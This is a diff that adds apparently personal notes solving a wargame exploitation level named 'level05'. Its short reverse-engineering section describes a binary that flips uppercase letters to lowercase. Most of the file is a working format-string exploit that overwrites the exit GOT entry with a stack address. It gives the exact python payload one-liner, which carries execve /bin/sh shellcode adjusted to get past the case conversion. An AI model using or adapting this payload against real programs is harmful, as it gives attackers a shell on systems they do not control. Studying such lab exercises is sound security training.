@@ -1,0 +1,35 @@
+/************************/
+/*    R E V E R S E 	*/
+/************************/
+
+-> buffer[100]
+-> fgets(buffer[100], 100, stdin) 
+-> if (len(input) <= local_14) print(input)
+-> local_14 = uint on stack
+-> if input[local_14] > '@' && < '[' then input[local_14] (Upper case LETTER)
+-> input[local_14] = XOR 0x20 (ex: A -> a)
+-> local_14++ 
+
+
+/****************************/
+/*	P A Y L O A D       */
+/****************************/
+
+objective:
+0x80497e0 <exit@got.plt>
+-> Overwrite got.plt addr to an addr in stack (shellcode)
+
+0xffffd6e0:	0x25783231	0x68243131	0xcccccc6e	0xcccccccc <-
+-> let's point to 0xffffd6ef:
+ffff: 65535
+d6ef: 55023 - 8 (2 addr) = 55015
+rest: 65535 - 55023 = 10512 
+
+-> we need to modify 0x50 (push eax) to 0x6a 0x00 (push 0x0)
+-> because the programm detect value in [41-5a] and XOR 0x20 on it
+
+(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55015x" + "%10$n" + "%10512x" + "%11$hn" + "\x90"*(62-28) + "\x31\xc0\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"';cat) | ./level05
+
+0x80497e0 <exit@got.plt>:	0xffffd6ef
+
+
